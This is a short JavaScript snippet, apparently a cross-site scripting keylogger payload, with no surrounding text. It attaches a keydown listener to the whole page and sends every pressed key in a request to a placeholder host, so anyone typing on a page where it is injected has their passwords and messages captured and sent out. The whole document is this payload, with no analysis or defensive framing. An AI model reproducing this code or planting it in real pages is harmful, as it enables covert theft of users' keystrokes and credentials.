function logKey(event){
	fetch("http://<HOST>/?key=" + event.key)
}

document.addEventListener('keydown', logKey);
